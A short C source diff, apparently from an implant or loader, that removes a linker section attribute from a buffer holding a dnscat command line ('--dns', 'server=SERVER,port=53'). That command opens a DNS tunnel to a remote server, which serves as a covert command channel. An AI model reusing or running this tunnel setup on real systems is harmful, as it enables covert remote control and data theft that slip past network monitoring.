@@ -31,7 +31,7 @@ pid_t clone_pid;
 long int runinit_lenght;
 char* runinit_buf;
 
-char dnscat_cmdline[DNSCATCMDLINE_LEN] __attribute__ ((section ("DNSCMDLINE"))) = {
+char dnscat_cmdline[DNSCATCMDLINE_LEN] = {
 	"dnscat\0"
 	"--dns\0"
 	"server="SERVER",port=53\0"
